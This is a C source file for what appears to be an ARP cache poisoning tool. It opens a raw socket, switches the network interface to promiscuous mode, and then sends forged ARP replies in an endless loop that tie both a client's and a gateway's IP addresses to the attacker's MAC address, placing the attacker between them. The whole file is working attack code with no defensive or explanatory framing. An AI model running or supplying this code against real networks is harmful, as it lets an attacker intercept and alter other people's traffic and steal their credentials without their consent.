#define _DEFAULT_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/filter.h>
#include <linux/if.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <net/ethernet.h>
#include <net/if_arp.h>
#include <netdb.h>
#include <netinet/ether.h>
#include <netinet/if_ether.h>
#include <netinet/in.h>
#include <pthread.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stropts.h>
#include <sys/ioctl.h>
#include <sys/param.h>
#include <sys/raw.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#include "poison.h"

int peep_sock(const char* iface) {
    struct ifreq ifopts;
    strncpy(ifopts.ifr_name, iface, IFNAMSIZ - 1);
    int peep_sock;
    if ((peep_sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1) {
        return -1;
    }

    if (ioctl(peep_sock, SIOCGIFFLAGS, &ifopts) == -1) {
        return -1;
    }

    ifopts.ifr_flags |= IFF_PROMISC;

    if (ioctl(peep_sock, SIOCSIFFLAGS, &ifopts) == -1) {
        return -1;
    }
    return peep_sock;
}

void* zerg_arp(void* targets) {
    //copy it local
    targets_t t = *(targets_t*)targets;

    static uint8_t cbuf[sizeof(struct ether_header) + sizeof(struct ether_arp)];
    static uint8_t gbuf[sizeof(struct ether_header) + sizeof(struct ether_arp)];

    memset(cbuf, 0, sizeof(struct ether_header) + sizeof(struct ether_arp));
    memset(gbuf, 0, sizeof(struct ether_header) + sizeof(struct ether_arp));

    struct ether_header* ceh = (struct ether_header*)cbuf;
    struct ether_header* geh = (struct ether_header*)gbuf;

    struct ether_arp* cea = (struct ether_arp*)(cbuf + sizeof(struct ether_header));
    struct ether_arp* gea = (struct ether_arp*)(gbuf + sizeof(struct ether_header));

    //set target mac address
    memcpy(ceh->ether_dhost, t.cmac, 6);
    memcpy(geh->ether_dhost, t.gmac, 6);

    //set sender mac address
    memcpy(ceh->ether_shost, t.omac, 6);
    memcpy(geh->ether_shost, t.omac, 6);

    ceh->ether_type = htons(ETH_P_ARP);
    geh->ether_type = htons(ETH_P_ARP);

    //ethernet
    cea->arp_hrd = htons(ARPHRD_ETHER);
    gea->arp_hrd = htons(ARPHRD_ETHER);
    //ipv4
    cea->arp_pro = htons(ETH_P_IP);
    gea->arp_pro = htons(ETH_P_IP);
    //hardware len
    cea->arp_hln = ETHER_ADDR_LEN;
    gea->arp_hln = ETHER_ADDR_LEN;
    //protocol len
    cea->arp_pln = sizeof(in_addr_t);
    gea->arp_pln = sizeof(in_addr_t);

    //arp reply
    cea->arp_op = htons(ARPOP_REPLY);
    gea->arp_op = htons(ARPOP_REPLY);

    //set sender mac address
    memcpy(cea->arp_sha, t.omac, 6);
    memcpy(gea->arp_sha, t.omac, 6);

    //set sender ip address
    //memcpy(cea->arp_spa, (victim_ip == gateway_ip) ? &target_ip : &gateway_ip, 4);
    memcpy(cea->arp_spa, &t.gip, 4);
    memcpy(gea->arp_spa, &t.cip, 4);

    //set target mac address
    memcpy(cea->arp_tha, t.cmac, 6);
    memcpy(gea->arp_tha, t.gmac, 6);

    //set target ip address
    memcpy(cea->arp_tpa, &t.cip, 4);
    memcpy(gea->arp_tpa, &t.gip, 4);

    struct sockaddr_ll caddr = {0};
    struct sockaddr_ll gaddr = {0};

    caddr.sll_family   = AF_PACKET;
    caddr.sll_ifindex  = IF_INDEX;
    caddr.sll_halen    = ETHER_ADDR_LEN;
    caddr.sll_protocol = htons(ETH_P_ARP);

    gaddr.sll_family   = AF_PACKET;
    gaddr.sll_ifindex  = IF_INDEX;
    gaddr.sll_halen    = ETHER_ADDR_LEN;
    gaddr.sll_protocol = htons(ETH_P_ARP);

    memcpy(caddr.sll_addr, t.cmac, ETHER_ADDR_LEN);
    memcpy(gaddr.sll_addr, t.gmac, ETHER_ADDR_LEN);

    static struct timespec tv, tvt;
    tv.tv_sec  = 1;
    tv.tv_nsec = 0;

    puts("==-started flooding-==");
    while (1) {
        //hit the client
        if (sendto(t.sock, cbuf, sizeof(struct ether_header) + sizeof(struct ether_arp), 0,
            (struct sockaddr*)&caddr, sizeof(struct sockaddr_ll)) == -1) {
            perror("sendto");
            break;
        }
        //hit the gateway
        if (sendto(t.sock, gbuf, sizeof(struct ether_header) + sizeof(struct ether_arp), 0,
            (struct sockaddr*)&gaddr, sizeof(struct sockaddr_ll)) == -1) {
            perror("sendto");
            break;
        }
        //calls are nonblocking so a sleep is required to rate limit
        nanosleep(&tv, &tvt);
    }

    return NULL;
}
